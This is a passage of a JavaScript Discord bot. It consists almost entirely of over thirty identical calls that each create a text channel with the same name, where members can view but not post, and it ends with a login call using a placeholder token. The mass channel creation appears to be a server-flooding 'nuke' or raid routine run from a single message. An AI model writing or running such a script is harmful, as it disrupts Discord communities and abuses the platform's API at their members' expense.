        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
      message.guild.channels.create(chnelname, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['VIEW_CHANNEL'],
            deny: ['SEND_MESSAGES'],
        }]
    }).catch(err=>{
        console.log(err)
    });
    }
   

    })

bot.login('bot ka token');
